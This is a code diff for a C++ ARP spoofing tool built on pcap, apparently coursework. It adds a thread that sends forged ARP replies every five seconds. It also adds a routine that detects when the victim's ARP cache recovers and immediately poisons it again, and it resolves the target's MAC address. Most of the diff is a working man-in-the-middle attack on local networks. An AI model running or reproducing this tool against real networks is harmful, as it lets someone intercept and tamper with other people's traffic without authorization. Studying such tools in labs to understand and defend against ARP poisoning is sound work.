@@ -14,6 +14,9 @@
 #include "arphdr.h"
 #include "mac.h"
 #include "ip.h"
+#include <iostream>
+#include <thread>
+#include <chrono>
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -129,13 +132,72 @@ Mac getSenderMac(pcap_t* handle, Mac my_mac, Ip my_ip, Ip sender_ip)
 		if((reqPacket->eth_.smac_ == resPacket->eth_.dmac_) && (reqPacket->arp_.tip_ == resPacket->arp_.sip_))
 		{
 			sender_mac = resPacket->eth_.smac_;
-			printf("sender mac: %s\n", std::string(sender_mac).c_str());
 			break;
 		}
 		else
 			continue;
 	}
 	return sender_mac;
+}
+
+bool isRecovered(struct EthArpPacket *listen_hdr, Mac my_mac, Mac sender_mac, Mac target_mac)
+{
+	if((listen_hdr->eth_.dmac_ == my_mac) || (listen_hdr->eth_.smac_ == my_mac))
+	{
+		return false;
+	}
+
+	printf("smac: %s", std::string(listen_hdr->eth_.smac_).c_str());
+	printf(" | dmac: %s", std::string(listen_hdr->eth_.dmac_).c_str());
+	printf(" | type: %04x\n", ntohs(listen_hdr->eth_.type_));
+
+	// sender2all(req)
+	if((listen_hdr->eth_.dmac_ == Mac::broadcastMac()) && (listen_hdr->eth_.smac_ == sender_mac) && (listen_hdr->arp_.op_ == ArpHdr::Request))
+	{
+		printf("sender2all request arp\n");
+		return true;
+	}
+
+	// target2sender(req)
+	if((listen_hdr->eth_.dmac_ == sender_mac) && (listen_hdr->eth_.smac_ == target_mac) && (listen_hdr->arp_.op_ == ArpHdr::Request))
+	{
+		printf("target2sender request arp\n");
+		return true;
+	}
+
+	// target2sender(res)
+	if((listen_hdr->eth_.dmac_ == sender_mac) && (listen_hdr->eth_.smac_ == target_mac) && (listen_hdr->arp_.op_ == ArpHdr::Reply))
+	{
+		printf("target2sender reply arp\n");
+		return true;
+	}
+	
+	// sender2target
+	if((listen_hdr->eth_.dmac_ == target_mac) && (listen_hdr->eth_.smac_ == sender_mac))
+	{
+		printf("sender2target\n");
+		return true;
+	}
+	return false;
+}
+
+void bgSendArp(pcap_t* handle, Mac sender_mac, Mac my_mac, Ip sender_ip, Ip target_ip)
+{
+	// Setting the thread as a daemon thread
+    pthread_setcancelstate(PTHREAD_CANCEL_DISABLE, NULL);
+    pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);
+
+	while (true)
+	{
+		// Sending arp spoofing to target
+		printf("======================\n");
+		printf("[Sending Spoof Packet Background]\n");
+		sendArp(handle, 2, sender_mac, my_mac, my_mac, sender_mac, target_ip, sender_ip);
+		printf("-> done\n");
+
+		// Wait for some time before sending the next spoof packet
+		std::this_thread::sleep_for(std::chrono::seconds(5)); // Adjust the interval as needed
+	}
 }
 
 int main(int argc, char* argv[])
@@ -175,6 +237,7 @@ int main(int argc, char* argv[])
         Ip sender_ip = Ip(argv[i * 2]);
         Ip target_ip = Ip(argv[i * 2 + 1]);
 		Mac sender_mac;
+		Mac target_mac;
 		printf("======================\n");
 		printf("[Sender & Target Info]\n");
 		printf("sender ip: %s\n", std::string(sender_ip).c_str());
@@ -182,12 +245,18 @@ int main(int argc, char* argv[])
 
 		// Sending arp packet & Parsing sender mac
 		sender_mac = getSenderMac(handle, my_mac, my_ip, sender_ip);
-		
+		target_mac = getSenderMac(handle, my_mac, my_ip, target_ip);
+		printf("sender mac: %s\n", std::string(sender_mac).c_str());
+		printf("target mac: %s\n", std::string(target_mac).c_str());		
+
+		// Sending arp spoofing background
+		std::thread spoofThread(bgSendArp, handle, sender_mac, my_mac, sender_ip, target_ip);
+
 		// Sending arp spoofing to target
 		printf("======================\n");
 		printf("[Sending Spoof Packet]\n");
 		sendArp(handle, 2, sender_mac, my_mac, my_mac, sender_mac, target_ip, sender_ip);
-		printf("done\n");
+		printf("-> done\n");
 
 		// listening the packet
 		while(true)
@@ -201,15 +270,20 @@ int main(int argc, char* argv[])
 				break;
 			}
 
-			struct EthHdr *eth_hdr = (struct EthHdr *)listen_packet;
-			printf("dmac: %s", std::string(eth_hdr->dmac_).c_str());
-			printf(" | smac: %s", std::string(eth_hdr->smac_).c_str());
-			printf(" | type: %d\n", eth_hdr->type_);
+			struct EthArpPacket *listen_hdr = (struct EthArpPacket *)listen_packet;
+
+			if(isRecovered(listen_hdr, my_mac, sender_mac, target_mac))
+			{
+				printf("need a infection\n");
+				
+				// Sending arp spoofing to target (reinfection)
+				printf("======================\n");
+				printf("[Sending Spoof Packet Again]\n");
+				sendArp(handle, 2, sender_mac, my_mac, my_mac, sender_mac, target_ip, sender_ip);
+				printf("-> done\n");
+			}
 		}
-
-
-
-
+		spoofThread.detach();
 	}
 	pcap_close(handle);
     return 0;
